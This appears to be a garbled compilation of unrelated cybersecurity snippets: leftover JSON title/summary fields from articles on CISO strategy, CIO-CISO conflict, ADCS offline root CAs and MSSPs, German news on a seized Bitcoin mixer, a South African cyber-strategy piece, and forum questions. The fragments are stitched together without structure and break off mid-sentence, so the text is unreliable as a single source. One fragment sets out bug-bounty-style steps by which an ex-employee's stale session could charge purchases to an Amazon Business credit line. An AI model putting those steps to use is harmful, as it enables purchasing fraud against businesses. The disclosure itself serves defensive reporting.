JavaScript and open-source ecosystem. In recent months, the community has seen a flurry of NPM-based attacks \u2014 including worm-style campaigns that transformed popular packages into Trojan horses, automated credential theft , and widespread supply chain compromise across both development and CI environments.

Is it a small startup, are there thousands of employees, etc. A very rough estimate would be appreciated. Your insights would be extremely valuable for my research.

      "title": "The CISO\u2019s paradox: Enabling innovation while managing risk",
      "summary": "We can keep it real here. One of the main jobs CISOs have is to stop being the \u201cDepartment of No.\u201d We have to figure out how to enable the rapid delivery of products and services for the business without introducing risks to the same business. That\u2019s the paradox in a nutshell. In an environment where product teams must constantly test new technologies and ship updates at record speed, traditional end-of-line audits wouldn\u2019t keep up. Security has to move upstream. It must be built into everyday operations, with proactive, actionable measures that empower innovation instead of slowing it down. CISOs, then, must work more closely with teams from the initial stages to establish clear and practical risk tolerances and build security into development workflows. Partner early to shape outcomes CISOs don\u2019t get leverage by showing up at the finish line. They must ditch the gatekeeper mindset and become true partners from Day Zero. In the past, when security measures were only brought in at the final stage, decision-makers were left with a difficult choice: accept project delays or face unmitigated risks. When product cycles were quarterly and speed did not determine competition, this approach made sense. In today\u2019s reality with AI-driven product development, such a process breaks in an environment now made up of weekly sprints, continuous delivery and vendor-driven dependencies. When security understands revenue goals, customer promises and regulatory exposure, guidance becomes specific and enabling. Begin by embedding a security liaison with each product squad so there is always a known face to engage in identity, data flows, logging and encryption decisions as they form. We should not want to see engineers opening two-week tickets for a simple question. There should be open \u201coffice hours,\u201d chat channels and quick calls so they can get immediate feedback on decisions like API design, encryption requirements and regional data moves. Bureaucracy must be deprecated in our environment. Show up at sprint planning and early design reviews to ask the questions that matter \u2014 authentication paths, least-privilege access, logging coverage and how changes will be monitored in production through SIEM and EDR. When security officers sit at the same table, the conversation changes from \u201cCan we do this?\u201d to \u201cHow do we do this securely?\u201d and better outcomes follow from day one. Set risk tolerances and guardrails Teams slow down when they are unsure how to proceed. Take away some of the decision-making and ensure an integration of authentication, authorization and accounting into the development process. For authentication, establish and leverage enterprise identity management solutions rather than allowing the development of accounts written to databases that can be easily compromised. CISOs must also ensure they define standard role-based access control levels that ensure clear separation of duties is in place in the solution design. For accounting, don\u2019t just create logs; ensure high-cardinality data is being captured for anomaly detection and this data is being integrated into a central security operations center for threat detection and response. Product development teams should not be tasked with security operations responsibilities; other teams should maintain the eye-on-glass visibility into the threats facing the solutions in production. CISOs must define the organization\u2019s risk appetite in business language that removes ambiguity. Specify which third-party profiles require deep assessment and which can run as bounded pilots with compensating controls. State which vulnerability severities must block a merge and which can proceed with a time-bound remediation plan. Clarify what data classifications may cross regions and what protections must travel with them. Then translate those choices into automation. Bake guardrails into CI/CD and infrastructure-as-code so enforcement is consistent and visible. Scan each code commit for vulnerabilities, and if a change breaches a critical policy, the build fails with a clear reason and a path to resolution. If it sits within tolerance, it moves forward without manual intervention. The result is governance as an accelerator: predictable, transparent and aligned with how design engineers work. Build secure-by-design into fast developer lifecycles When developers deploy code multiple times a day, a \u201cfinal security review\u201d before launch just wouldn\u2019t work. This traditional, end-of-line gating model doesn\u2019t just block innovation but also fails to catch real-world risks. To be effective, security must be embedded during development, not just inspected after. If the secure path is harder than the insecure path, developers will choose the easy way every single time. Our job isn\u2019t to hand out a 50-page PDF; it\u2019s to bake security right into their developer environment, giving them pre-vetted, hardened templates that are secure by default. This means offering standard service templates with authentication and authorization already built in. When the secure component is easier to use than the insecure alternative, developers can adopt it easily and will adopt it every time. Automation is the enforcement layer for this strategy. When security tools are integrated directly into the CI/CD pipeline, feedback becomes available almost in real-time. This allows the team to \u201cfail fast\u201d on critical risks while providing actionable fixes. This discipline must further extend into production. Even with world-class DevSecOps, we know a zero-day or configuration drift can happen. That\u2019s why we rely on over-arching web application shielding solutions that integrate a robust web application firewall with runtime application attack mitigation and self-protection. These solutions mitigate vulnerabilities and risks in real-time while the application is running in production. They buy the development teams the crucial time they need to resolve the underlying issue without service interruption or breach, ensuring that even if all other controls fail, we have a way to block and tackle in the critical moment. Runtime telemetry and risk-based alerting are the final checks on this coverage. This promotes a cultural change that enables engineers to take full ownership of their applications, from the initial line of code all the way to production. Security, in turn, achieves thorough, lasting coverage without becoming a bottleneck. This article is published as part of the Foundry Expert Contributor Network. Want to join?",

Happy to elaborate below for full repro\u2014 all on self-owned test accounts to stay in scope. \u00b0 Initial Account Setup (Exact Steps for Attacker/Ex-Employee to Gain Credit Line Access): This assumes a standard Amazon Business account (e.g., EIN-registered SMB with 6+ months history, as per approval norms).

Initially a limit of $5k but bumped to $25k after I made personal purchases with my own card. \u00b0 Attacker Pivot (Post-Termination Access): Ex-employee logs in with cached/stale work email (no MFA re-prompt if session active) Navigate to \"Cart\" > Place purchase > Select \"Pay by Invoice/Credit Line.\" System grants access without validating current employment (e.g., no popup: \"Confirm active status?)

For anyone who\u2019s been in the industry longer: How realistic is it for someone early in their CYS journey to build a startup or small company in this field?

I\u2019m trying to understand what actual paths exist for beginners who want to eventually build something meaningful. I\u2019d also appreciate honest insights on: What challenges new founders face in cybersecurity (credibility, competition, regulations, etc.). Which areas are more accessible for newcomers. And how building a cybersecurity startup differs from launching something in AI (barriers, trust, technical depth, market expectations).

The future of digital security in South Africa will be shaped not only by technology but also by language, locality, and policy. This approach recognizes that effective cybersecurity in South Africa must be tailored to the country\u2019s unique cultural and regulatory landscape, rather than simply importing solutions from abroad. Deputy Minister Mondli Gungubele , in his keynote address, noted the importance of viewing cybersecurity through the lens of local realities. He stressed that South Africa\u2019s diverse linguistic, social, and policy contexts play a critical role in shaping how cyber threats are understood and addressed. \u201cThe challenges we face are global in reach, yet profoundly local in impact,\u201d Gungubele noted, highlighting how transnational cybercrime exploits gaps in digital literacy, regulatory frameworks, and infrastructure access. Recent data from Cyble illustrates the urgency of this issue. Over the past six months, ransomware activity in South Africa has been concentrated among several prominent groups. NightSpire and INC Ransom emerged as the most active actors; each was linked to two documented incidents. (Source: Cyble Vision) Other groups, including Everest, BEAST, and CLOP, contributed to individual attacks, revealing a threat landscape marked by a mixture of new and established cybercriminal operations. These attacks targeted sectors ranging from government and law enforcement to education, healthcare, construction, and IT services, demonstrating that no sector is immune. Integrating Culture, Policy, and Technology The new South African cybersecurity strategy recognizes that traditional approaches, which often rely solely on technical defenses, are insufficient. Digital transformation is advancing across South Africa, with initiatives spanning e-government services, online education, fintech, and digital agriculture. While these developments offer opportunities for economic growth and inclusion, they also expand the attack surface, making cybersecurity a foundational concern rather than an optional add-on. A key feature of the strategy is its emphasis on cultural and contextual awareness. South Africa\u2019s diversity means that one-size-fits-all cybersecurity campaigns are often ineffective. Language, communication norms, and local social structures all influence how individuals perceive risk and respond to threats. By incorporating cultural intelligence into cybersecurity policy, the country aims to foster a security posture that is both technically robust and socially adaptive. Aligning with Global Standards The strategy also stressed the need for stronger alignment with international standards. South Africa\u2019s participation in the UN Cybercrime Treaty highlights a harmonized global response to transnational threats. The treaty establishes a shared legal framework for recognizing cybercrimes, facilitating international cooperation, and building capacity for nations that face resource constraints. For South Africa and the broader Global South, this represents an important step toward integrating African cybersecurity initiatives with global best practices. Digital literacy forms another pillar of the strategy. Evidence shows that human error accounts for a substantial proportion of security incidents. By equipping citizens and employees with the knowledge to identify phishing, malware , and disinformation, South Africa aims to create a human layer of defense that complements technological measures. Programs emphasizing digital ethics, risk awareness, and responsible online behavior will be essential in building a resilient cybersecurity culture. Working Together for a Stronger Cyber Defense Moreover, the strategy encourages a \u201ctriple helix\u201d collaboration among government, industry, and academia. By pooling resources and perspectives, South Africa can accelerate research, threat intelligence sharing, and policy development. This new approach to cybersecurity in South Africa signals a departure from conventional, purely technical strategies. By integrating local realities, cultural awareness, and global cooperation, the strategy has the potential to redefine the country\u2019s digital defense posture.

Bundeskriminalamt Ermittlern aus Deutschland und der Schweiz ist ein Schlag gegen Online-Geldw\u00e4sche mit Kryptow\u00e4hrungen gelungen. Wie die Beh\u00f6rden mitteilten, wurde die Serverinfrastruktur eines sogenannten Bitcoin-Mixers beschlagnahmt und die Plattform erfolgreich abgeschaltet. Dabei wurden Kryptow\u00e4hrungen im Wert von umgerechnet rund 25 Millionen Euro sichergestellt. An den Ermittlungen waren die Generalstaatsanwaltschaft Frankfurt am Main, die Kantonsstaatanwaltschaft Z\u00fcrich, das Bundeskriminalamt und Europol beteiligt, der Zugriff erfolgte laut Mitteilung am vergangenen Mittwoch. \u201cDiese Operation ist ein weiterer, bedeutsamer Schritt bei der internationalen Bek\u00e4mpfung von Online-Geldw\u00e4sche durch Krypto-Mixer\u201d, sagte Vize-Pr\u00e4sidentin Bundeskriminalamt Martina Link.

Dabei konnten Kryptow\u00e4hrungen anonym ein- und ausgezahlt werden. Es bestehe der dringende Verdacht, dass ein Gro\u00dfteil der dort getauschten Verm\u00f6genswerte kriminellen Ursprungs war, so das BKA. Den Betreibern wird daher gewerbsm\u00e4\u00dfige Geldw\u00e4sche sowie das Betreiben einer kriminellen Handelsplattform vorgeworfen. In der Schweiz wurden die Serverinfrastruktur, mehrere Mailaccounts beschlagnahmt und Datenmaterial als Beweismittel gesichert. (dpa/jm)",

      "title": "12 signs the CISO-CIO relationship is broken \u2014 and steps to fix it",
      "summary": "Despite the need for collaboration between security and IT, all is not well in the CISO-CIO relationship. And it\u2019s not about newly minted CISOs trying to find their footing, as Gartner research has found that while around a third of CISOs with less than two years of experience report conflicts with their CIOs on key security-related areas, half of CISOs with five or more years of experience report conflicts in most of those same areas, including improving the organization\u2019s cyber resilience and negotiating enterprise cyber risk appetite. Conflict can be a sign that the CIO-CISO relationship is broken, says Christine Lee , vice president of research and content leader for Gartner\u2019s cybersecurity research team, but not always. In fact, other signs may be more telling indicators that the CIO and CISO are not working in concert, according to researchers, experienced executives, and executive advisors. Signs of trouble Security leaders and advisors offer CISOs the following signs that indicate there may be trouble worth addressing in their relationship with their CIO colleagues: 1. The CIO commonly disregards or overrides the CISO\u2019s recommendations and decisions. Aimee Cardwell , CISO in residence at tech company Transcend and former CISO of UnitedHealth Group, says this situation often plays out with the CIO saying, \u201cThank you for your input, but we\u2019re going to do what we want anyway.\u201d 2. The CIO and CISO can\u2019t resolve conflict. Conflict can be healthy for moving an organization forward. Diversity of perspectives and opinions can provide top executives with new possibilities and opportunities for compromise that benefit the organization overall. But if the CIO and CISO can\u2019t resolve differences without escalating their disagreement to more senior executives, then a fundamental problem may be taking root. \u201cAre you shoulder to shoulder or nose to nose? Because if you\u2019re going nose to nose, then there\u2019s misalignment,\u201d Cardwell says. Gartner research notes that 87% of experienced CISOs describe their relationship with the CIO as \u201cgood\u201d or \u201cexcellent\u201d when it comes to resolving conflicts. Gartner\u2019s Lee says this figure shows that conflict itself doesn\u2019t mean the relationship is problematic. Rather, \u201cit\u2019s the inability to make progress or get to agreement that is a sign the CIO-CISO relationship is broken,\u201d she says. 3. The CIO isn\u2019t sharing information. \u201cThat\u2019s a gigantic red flag,\u201d Transcend\u2019s Cardwell says. 4. The CIO alters or blocks the CISO\u2019s message to the board. It\u2019s problematic enough when the CISO doesn\u2019t present directly to the board on a regular basis, but Cardwell says it\u2019s even more troubling when the CIO is changing the information the CISO believes the board needs to have. \u201cThis goes beyond advice like, \u2018You can word this a better way,\u2019 or \u2018You can tell the story in a better way.\u2019 It\u2019s not just the CIO coaching. It\u2019s cutting facts that need to be elevated or making changes that could create a real moral problem for you as a CISO,\u201d she explains. 5. The CIO otherwise undermines the CISO\u2019s agenda to the board and other executives. \u201cIf the CIO is actively undermining the CISO\u2019s credibility and opinions, if the CIO is mediating every conversation between the CISO and the board and executive team, that\u2019s not a good sign,\u201d Lee says. Trouble here also includes the CIO\u2019s failure to advocate for the CISO\u2019s priorities in important meetings and the organization\u2019s IT strategy overall. 6. The CISO is not consulted on business initiatives involving IT. True partnership on any IT initiative would see the CIO and CISO working together from step one. But if the CISO is finding out about important tech initiatives late in the process or only by asking probing questions, it\u2019s time to reset the relationship. \u201cIf someone says something about a new project or vendor or migration and the CISO doesn\u2019t know something about it, then that\u2019s a problem, because you\u2019re then bolting on security,\u201d says Dale Hoak , CISO for software firm RegScale. \u201cIn a good relationship, there are no surprises because you\u2019re having continuous conversations and you\u2019re sharing dashboards.\u201d 7. There are no one-on-one conversations. LevelBlue CIO Maria Cardow says CIOs and CISOs who share information only via emails, through group meetings or between CIO and CISO subordinates (assuming that information will flow up) do not have a healthy rapport. \u201cWe have too much information in front of us to not be talking to each other directly; there is no substitute for conversations on a regular and on an ad-hoc basis,\u201d she says. 8. The CIO and CISO don\u2019t know each other\u2019s priorities, challenges, strategies, etc. \u201cAs a CIO I should have a good idea of what my CISO\u2019s concerns are and the CISO should know what\u2019s going on in my world,\u201d Cardow says. 9. The CISO and CIO clash on who should be doing what work. A similar sign of trouble is when one side blames the other for shortcomings in areas where they had joint responsibilities. 10. One buys technology with capabilities the other already has. This sign of trouble in the relationship goes both ways, but a related problem involves the CIO dictating the products the CISO must buy or the vendors or service providers the CISO must use. \u201cIn some cases those might be the right answer for security, but in some cases they might not be the right answer,\u201d says Ayan Roy , EY\u2019s Americas cybersecurity competency leader. \u201cBut just being told means there is not the right analysis being done. The CIO should give the CISO the latitude to pick the right solution; the CISO needs to be able to do the evaluation and to make the right pick.\u201d 11. The CIO isn\u2019t prioritizing cyber hygiene. One of the most common indications here is failing to or foregoing patching vulnerabilities that the security team has identified and prioritized for remediation. 12. Technology products are commonly released with security flaws or control gaps. \u201cThe question then is, \u2018Why didn\u2019t we figure that out during the product design lifecycle,\u2019 and the answer is usually poor collaboration between IT and security,\u201d says Sara Madden , CISO of Convera, a global payments and foreign exchange company. The CIO-CISO relationship matters The CIO and CISO need to have a strong relationship for either of them to succeed, says MK Palmore , founder and principal adviser for advisory firm Apogee Global RMS and a former director in the Office of the CISO at Google Cloud. \u201cIt\u2019s critical that those in these two positions get along with each other, and that they\u2019re not only collegial but collaborative,\u201d he says. Yes, they each have their own domain and their own set of tasks and objectives, but the reality is that each one cannot get that work done without the other. \u201cSo they have to rely on one another, and they have to each recognize that they must rely on each other.\u201d Moreover, it\u2019s not just the CIO and CISO who suffer when they aren\u2019t collegial and collaborative. Palmore and other experts say a poor CIO-CISO relationship also has a negative impact on their departments and the organization as a whole. \u201cA strained CIO-CISO relationship often shows up as misalignment in goals, priorities, or even communication,\u201d says Marnie Wilking , CSO at Booking.com. \u201cWhen technology and security leaders are not on the same page, it becomes clear in both operations and outcomes, from missed project deadlines to increased vulnerabilities.\u201d Multiple factors can contribute to a strained relationship. To start, the security department is still sometimes seen as \u2014 and acts like \u2014 the department of \u201cno,\u201d Cardwell says. \u201cThe CIO never has the luxury of saying \u2018no.\u2019 The CIO\u2019s job is to enable what the business is trying to do. So the CISO needs to have that mindset, too: \u2018The business wants to do this thing, and my job is to figure out how to make that possible,\u2019\u201d she explains. Even if security doesn\u2019t act like the department of \u201cno,\u201d Cardwell says, it may take the CISO too long to get to \u201cyes.\u201d \u201cThere are a hundred ways, depending on what the problem is, to solve the problem quickly,\u201d she says. \u201cAs a CISO, I like to provide several solutions with different price points and timelines with pros and cons and security scores, from fastest on or least secure or most secure on this timeline, to give the CIO and the business options.\u201d Another reason for a poor relationship: Sometimes the CIO doesn\u2019t place a high enough priority on security. \u201cMaybe the CISO is only security-minded but not thinking as a business-enabler; or maybe the CIO isn\u2019t at all security-minded and only focused on business enablement,\u201d Palmore says. In other cases, the CIO wants tight control of all things IT and excludes security \u2014 or vice versa. \u201cSome security leaders believe that they alone own security and find themselves on an island without a boat to get them home,\u201d says Kory Daniels , chief security and trust officer at LevelBlue, a managed security services provider. Other factors that can lead to a poor CIO-CISO relationship are more structural, experts say. It may be that the organization has not defined each position\u2019s responsibilities. \u201cWhen roles and responsibilities aren\u2019t clearly defined, overlaps or gaps in accountability can create unnecessary risk,\u201d Wilking says. Or it could be that the organization\u2019s funding process turns them into \u201cadversaries for the same dollar,\u201d Cardow says. Much of these problems stem from what Wilking says is \u201ca lack of shared context and alignment around enterprise risk.\u201d \u201cThe CIO is typically measured on uptime, scalability, and agility, while the CISO is focused on protecting data, ensuring compliance, and mitigating threats. Without a unified view of how those priorities intersect, the two can seem at odds,\u201d she explains. \u201cToo often, cybersecurity gets treated like the gatekeeper instead of a true partner. Teamwork ends up feeling transactional instead of collaborative. At Booking.com we emphasize embedding cybersecurity into business strategy from the start, ensuring it\u2019s part of every conversation about product design, data, and customer trust.\u201d How to improve a poor relationship CIOs and CISOs both have incentives to improve a problematic relationship. As Lee explains, \u201cThe CIO-CISO relationship is critical. They both have to partner effectively to achieve the organization\u2019s technology and cybersecurity goals. All tech comes with cybersecurity exposure that can impact the successful implementation of the tech and business outcomes; that\u2019s why CIOs have to care about cybersecurity. And CISOs have to know that cybersecurity exists to achieve business outcomes. So they have to work together to achieve each other\u2019s priorities.\u201d CISOs can take steps to develop a better rapport with their CIOs, using the disruption happening today \u2014 whether from AI or the uncertainty in the economy \u2014 as an opportunity to check in, reset the relationship, and address any issues that have stymied collaboration. Steps for CISOs include: Establishing alignment with the CIO as well as members of the C-suite and the board on the organization\u2019s position on risk. Ensuring security is aligned with the organization\u2019s strategy and its IT roadmap. Transcend\u2019s Cardwell says it\u2019s important for CISOs to think, \u201cThe CIO has a great thing here. I\u2019d like to find how to make it secure.\u201d Getting clarity on CIO and CISO responsibilities. \u201cYou need clarity on where the lines are drawn,\u201d LevelBlue\u2019s Daniels says. Making regular and ad hoc direct communication with the CIO a priority. Focusing on relationship management. \u201cCommunicate, be willing to meet, get teams to meet, establish trust,\u201d Daniels says. Seeking to understand the CIO\u2019s priorities, incentives, and challenges and sharing yours. \u201cFind a way to walk a mile in the other\u2019s shoe,\u201d Daniels adds. Shifting to a business-enablement mindset. \u201cInstead of leading with \u2018no,\u2019 lead with \u2018How do we get there securely,\u2019\u201d RegScale CISO Hoak says.",

      "title": "Implementing and Managing an ADCS Offline Root Certificate Authority (Part 1)",
      "summary": "My name is Ron Arestia, and I am a Security Researcher with Microsoft\u2019s Detection and Response Team (DART). We respond to customer cybersecurity incidents to assist with containment and recovery from threat actors. In this blog post, we will be covering the basics of implementing an Active Directory Certificate Services (ADCS) offline root Certificate Authority (CA) and how to manage it securely. This is the first in a series of follow up posts to my original article reviewing Secure Configuration and Hardening of Active Directory Certificate Services . In Part 1 of our series, we will focus on some high-level security discussions around your offline root certificate authority before you even begin installing the operating system. Secure Source, Secure Start Confidence in your PKI begins with a secure source Are you familiar with the concept of a \u201csecure source?\u201d The term itself might seem a bit nebulous, so let\u2019s unpack the concept contextually with general understanding and expand to Public Key Infrastructure (PKI). In the larger context of \u201czero trust,\u201d think of secure source as generally meaning a trusted publisher of some set of data such as software. Microsoft publishes the Windows operating system, and the binaries for those operating systems are available from locations such as the Volume Licensing portal or Visual Studio Enterprise. Each download is published with a corresponding SHA hash. Why? If you use a tool like Get-FileHash in PowerShell against the downloaded binary, it will output a hash of the file that is unique to the data therein. The software publisher, Microsoft in this case, has gone through this same process prior to publishing to verify that the data in the binary has not changed. You can use any hashing tool to check your file integrity the same way: This file is identical to the file published by Microsoft, and it can be considered a true source as published. If the source file was manipulated in transit or after download, the hashes would not be the same. Using more complex hashing algorithms, such as SHA256, provides greater confidence that the file has not been manipulated, and thus, you can trust that this is the operating system published by Microsoft. This is a secure source file. Using this source ISO ensures that you are using a true copy of the Windows operating system as provided by Microsoft. This can be extended to any modern operating system available for download (e.g., Linux). Now that you have a secure source file, take a look at your hardware. Are you going to use a physical server to house your root certificate authority (CA)? Or are you going to install the root CA as a virtual machine (VM) on an existing hypervisor? If you\u2019re using a physical server, is the platform brand new from a trusted distributor, or are you piecing together a platform from spare parts? In the interest of secure source, I\u2019d recommend you defer to the former, but if you\u2019re confident in your spare parts inventory, you can use a previous platform with the caveat that you update all of the applicable firmware on either the new platform or the old. Why? Physical servers by major distributors such as Cisco, Dell, and HP are a complex set of hardware platforms including power management, remote access controllers, disk controllers, and mainboards. Since the physical server isn\u2019t currently in use, it\u2019s the best time to update all of the firmware and prepare all of the most up-to-date software drivers for your installation to ensure common platform security issues are patched to current. A truly offline CA likely won\u2019t suffer a catastrophic security compromise but taking pains to update your architecture prior to its implementation is the best strategy to ensure you aren\u2019t scrambling to secure your platforms under duress in the future. As with the operating system, make sure you are comparing hashes for all of your firmware and software updates and documenting those hashes for future security or compliance audits. If you are planning to implement an offline root CA on a virtualization platform, you are necessarily expanding your risk footprint unless you are installing the root CA virtual machine (VM) on a tier 0 hypervisor with strict access controls. Why? As discussed in my first post in this series, and as we will discuss later, the private key of your root CA is the most important logical piece of information for your public key infrastructure (PKI). Protection of the private key is tantamount to every other operation for your PKI. If your private key lives on the local disk of your server, who has access to that hard drive? In a virtual environment, you\u2019re sharing physical disks with other servers. Are your VM infrastructure engineers trusted? If a threat actor compromises the account of one of those engineers, they could easily exfiltrate the VMDK or VHDX of your offline root and have their way with the private key for your root CA. Consider it best practice, when virtualizing your root CA, that the virtual machine live on a dedicated tier 0 hypervisor with limited, controlled access. If you have a dedicated platform for your other tier 0 assets, your root CA can live therein with the proper controls in place. If you don\u2019t have a tier 0 hypervisor, you still have options. On a trusted workstation such as a secure/privileged access workstation (SAW or PAW) running Windows, you can install the Hyper-V role and setup a VM to run the offline root CA. In my experience, you still want to secure and segregate the disk, so installing a dedicated disk using a USB disk controller or even just a thumb drive to house your root CA installation is preferred. This also gives you the ability to lock the physical disk in a fire safe to control physical access to the private key. It\u2019s also possible to take a physical desktop or laptop slated for decommissioning giving it a new life as your root CA. This physical system can be locked in a secure location for safekeeping the same as the hard drive in the previous example albeit requiring more physical space which is why we usually see customers using a USB drive on a trusted system to run the root CA. The length of time required for this system to be setup, perform the required signing operations, and shutdown for safekeeping should be less than a day. All of these ideas are tangential to the conversation of secure source, but it\u2019s important to note that the secure source mentality should extend to the hardware you choose to use for your offline root CA. For instance, you would never use a laptop that was previously removed from inventory under suspicion of housing malware. Even if you completely wiped the disk, replaced the RAM, updated the UEFI/BIOS, there\u2019s still a non-zero chance that the platform isn\u2019t safe. Security of your offline root CA platform should be top-of-mind in every decision made. Finally, your root CA installation and setup should follow a clean source/clean keyboard mentality all the way through to go live. The system should never be attached to a network in any way. (This introduces some complications in a virtualization environment even if you never connect a virtual adapter to the VM; the hypervisor itself is connected to some network, introducing some risk even on a sanitized tier 0 platform.) If you\u2019re not leveraging a hardware security module (HSM) for the private key, the disk should be completely sequestered from any environment where any untrusted identity could access it or any of its ephemeral existence (i.e., backups, checkpoints, snapshots). And you want to ensure that you have dedicated but secure access to console to manipulate the operating system during setup and for future use. This should include a strategy to move certificate signing requests (CSRs), certificate revocation lists (CRLs), and authority information access (AIA) data such as the root and issuing CA certificates to and from the new root CA. The Private Key (Why You Should Be Using HSM) The most important logical piece of your PKI should not be on disk I want to impress upon our customers the importance of the idea that the root certificate authority (CA) private key is the most important logical piece of information for your public key infrastructure (PKI). What does this mean? Think of the private key for your root CA as the key to the front door of your home. If you own your home, you are the sole responsible party for the safety of that key. If you purchased a brand-new home, you\u2019re likely the only person who has that key. You will be very prescriptive with whom you share that key. Your spouse or significant other, responsible members of your immediate family, maybe even close friends or neighbors will have a copy of that key to help you maintain or watch over your home while you\u2019re away or for your safety if you live alone. If you purchase a pre-owned home, you will likely prioritize changing the locks of your new home, because you don\u2019t know the people who might have a copy of that old key, and you will distribute that new key to individuals named previously. You should feel safe and secure in your own home. Similar to the key to your home, the private key of your root CA should be safeguarded with the same zeal. If the private key of your root CA is in the hands of an individual or entity outside of your knowledge or control, the ability to sign certificates and certificate revocation lists (CRLs) is not exclusively under your control. If you\u2019re not scrutinizing who is in your enterprise environment, anyone with a copy of that key could stand up a root CA, grab a copy of your root CA certificate, and use those two pieces of data to create certificates that look and act the same as certificates issued by your legitimate, known root CA. They can also generate CRLs that could be accepted as legitimate by your existing PKI sans certificates that you might have revoked for any reason. If every system in your enterprise trusts a single root CA, and that single root CA now exists as a rogue system in your environment, there\u2019s nothing to prevent a threat actor from masquerading as a legitimate purveyor of certificates in your environment: server authentication certificates, user authentication/smart card certificates, and even code signing or trusted publisher certificates. The private key is the single most important logical piece of data for your PKI. This data is stored by default on the system drive in your Windows Active Directory Certificate Services (ADCS) CA. A simple Internet search will reveal common locations for this key, so I will not publish that through this forum in deference to security. Using certutil, however, you can backup the private key of your root CA, and it will exist on the local hard disk available to anyone with access to that system programmatically or physically through ownership of the disk or partition. (This includes via access to a virtual disk under virtual infrastructure.) Keeping the private key on the local hard disk of your root CA is akin to leaving your house key under your door mat. Is it safe there? Maybe, but there\u2019s a non-zero chance that an untrusted person could simply lift the mat and gain access to your home. Keeping your root CA truly offline is arguably a better strategy and critical if you do not plan to implement a hardware security module (HSM). To continue with the house key analogy: it\u2019s merely a clever way to obfuscate the key like one of those hide-a-key decorative rocks or placing the key in a more obscure location like under a sprinkler donut. So why should you invest in a hardware security module (HSM)? The most common reason to not use HSM is cost, but several retail companies provide USB HSM devices for under US$1,000 which makes the availability much more financially viable for small businesses. For larger businesses, I would recommend enterprise-class hardware usually in the form of a tamper-resistant rackmount device with some sort of authorization to access the data thereon, ideally through the use of multifactor authentication (MFA). Cloud providers such as Microsoft are also providing HSM-as-a-service (HSMaaS) with comprehensive integration capabilities you should also investigate if you are a cloud-only enterprise or looking to reduce your on-premises datacenter footprint. The HSM is a standalone platform dedicated to performing complex cryptographic operations such as random number generation, key generation, encryption and decryption, signing, and hashing. By offloading these operations to a dedicated platform, you are reducing the need to perform them on individual servers, possibly saving you processor time on individual servers and centralizing cryptographic operations on a secure platform that is physically and logically hardened against attackers. A driver and application programming interface (API) are used by the dependent system, such as your certificate or registration authorities, to perform key generation and access without exposing the key information. In the case of your offline root CA, this means that the generation of your private key and signing of certificate signing requests (CSRs) and certificate revocation lists (CRLs) with that key are not performed by the CA itself but through an interface to the HSM whereupon those operations are performed safely and the generated outputs passed to the CA for further operations. Since the private key never exists on the root CA in any form, the ability for a threat actor to gain access to this critical data is impossible. Note: HSMs are cryptographic devices subject to export controls. It\u2019s possible that your country has strict regulations for these devices. Please familiarize yourself with your state or national laws concerning these devices and make choices appropriate for your enterprise. Without the private key of your root CA or any of your registration authorities (RA) or subordinate/issuing CAs, even the most advanced persistent threats would find it impractical to even try to masquerade as the same or perform any trusted cryptographic operations in your environment. They would move on to other high value targets in your environment not otherwise entangled with your PKI. One last important note: implementing HSMs in your environment does not negate the need for your root CA to be truly offline nor does it abrogate any of your administrative responsibilities to best practice adherence. They are advanced tools designed to provide a high level of assurance for your organization\u2019s cryptographic operations, and as with any tool, there are avenues for misuse, misconfiguration, and abuse without proper training and diligence. Consult your Microsoft and HSM professionals for guidance on how to integrate HSM into your organization. Whether you\u2019re starting fresh with PKI or you have a mature implementation, HSM should be considered universally for any security practitioner. That\u2019s going to conclude Part 1 of our series on securing your ADCS offline root CA. In Part 2 we will discuss guidelines for CRL and AIA publishing and common root CA deployment scenarios.",

      "title": "7 Anzeichen f\u00fcr akuten MSSP-Bedarf",
      "summary": "Managed Security Service Provider k\u00f6nnen das Sicherheitsniveau nachhaltig steigern. Godlikeart | shutterstock.com Ein Managed Security Service Provider (MSSP) bietet seinen Kunden ein umfassendes Spektrum an Sicherheits-Services. Als Drittanbieter kann ein MSSP die Arbeitsbelastung der internen IT-Teams deutlich reduzieren und Zeit freisetzen, um sich mit essenziellen Unternehmensprozessen und strategischen \u00dcberlegungen auseinanderzusetzen. Dar\u00fcber hinaus kann ein MSSP unter anderem auch dazu beitragen, Qualifikationsl\u00fccken zu schlie\u00dfen und Alarmmeldungen zu reduzieren . Die folgenden sieben Anzeichen deuten darauf hin, dass Ihr IT-Team die Grenze seiner Belastbarkeit erreicht oder bereits \u00fcberschritten hat. In diesem Fall sollten Sie dringend in Erw\u00e4gung ziehen, mit einem MSSP zusammenzuarbeiten. 1. Unzureichender Schutz Ein MSSP bietet Zugang zu Sicherheitssupport auf Expertenniveau, ganz ohne ein internes Team aufbauen und unterhalten zu m\u00fcssen. \u201cManaged Security Service Provider bieten Tools, Knowhow und Rund-um-die-Uhr- Monitoring . Das k\u00f6nnen die meisten Unternehmen nicht so einfach intern umsetzen\u201d, meint Gyan Chawdhary , Gr\u00fcnder und CEO des Cybersecurity-Schulungsanbieters Kontra. Ein MSSP k\u00f6nne sowohl Bedrohungen fr\u00fchzeitig erkennen als auch gew\u00e4hrleisten, dass auf Vorf\u00e4lle eine schnelle Reaktion folge, so der Manager. Dabei sollten Sicherheitsentscheider nicht nur auf Tools achten , sondern auch auf \u201cweiche\u201d Faktoren, r\u00e4t Chawdhary: \u201cWas wirklich z\u00e4hlt, sind Erfahrung, Zuverl\u00e4ssigkeit und die Kommunikationsf\u00e4higkeit eines MSSP. Sie brauchen einen Anbieter, der Ihre Branche versteht, schnell reagiert, wenn etwas schief geht, und transparent dar\u00fcber informiert, was er tut und warum.\u201d Der CEO warnt jedoch, dass MSSPs zwar im Umgang mit technischen Problemen und Bedrohungen versiert sind, aber nicht alles l\u00f6sen k\u00f6nnen: \u201cEine schwache Sicherheitskultur , schlechte interne Richtlinien oder Insider-Bedrohungen liegen oft au\u00dferhalb ihrer Kontrolle.\u201d 2. L\u00e4hmende Warnmeldungen Wenn Ihr SOC-Team t\u00e4glich 300 Warnmeldungen ignoriert und manuell triagiert, ist das ein deutliches Zeichen daf\u00fcr, dass Sie einen Managed Security Service Provider in Betracht ziehen sollten. Das sieht auch Toby Basalla , Gr\u00fcnder und Principal Data Consultant bei Synthelize, so. \u201cWenn Chaos herrscht, wer wei\u00df dann noch, welche Red Flags wirklich ernst zu nehmen sind? Sie w\u00fcrden wahrscheinlich auch nicht Daten rund um die Uhr ohne Redundanz verarbeiten. Mit Blick auf Security verh\u00e4lt es sich nicht anders.\u201d 3. Brandbek\u00e4mpfung First Wenn sich das interne Team nicht nur schwer damit tut, Alerts zu bew\u00e4ltigen, 